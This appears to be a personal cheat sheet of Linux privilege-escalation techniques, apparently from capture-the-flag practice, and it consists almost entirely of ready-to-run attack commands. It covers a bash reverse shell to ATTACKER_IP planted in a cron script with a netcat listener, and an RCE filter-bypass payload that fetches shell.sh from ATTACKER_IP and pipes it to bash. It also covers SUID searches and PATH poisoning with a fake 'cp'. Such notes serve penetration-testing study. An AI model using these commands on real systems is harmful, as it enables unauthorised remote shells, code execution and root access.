### capabilities
```
sudo -l  
# use website GTFObins to check what you can do with this command output
```
[https://gtfobins.github.io/gtfobins/xxd/](https://gtfobins.github.io/gtfobins/xxd/)

### crontab
if there is something interesting in crontab:
```bash
cat /etc/crontab
```
and if we have rights to modify this script running in cron we can escalate privileges:
```bash
# on attacker machine:
nc -nlvp ATTACKER_PORT
# on target modify crontab script to gain reverse shell
echo "/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" >> /opt/script.sh
```
### find files owned by user
```bash
find / -user charlie 2>/dev/null
```
### find files owned by group
```bash
find / -group valleyAdmin -type f 2>/dev/null
```
### find files with SUID bit set
these files are executed with owner priviledge:  
```bash
find /bin -perm -4000
```
### LD_PRELOAD linux privilege escalation

[https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

### RCE filtering bypass:
![[Pasted image 20251230144012.png]]
example commands  
command=curl ATTACKER_IP:8082/shell.sh | ba\sh

### connecting to internal ports using port forwarding
```bash
ssh -L 9001:127.0.0.1:9001 -i user_rsa user@TARGET_IP
```
### docker tricks
![[Pasted image 20251230144121.png]]
### PATH variable poisoning

[https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
example backup script using command cp from PATH:
```bash
cd /tmp  
echo "/bin/bash" > cp  
chmod 777 cp  
export PATH=/tmp:$PATH  
cd secret/  
./backup
```
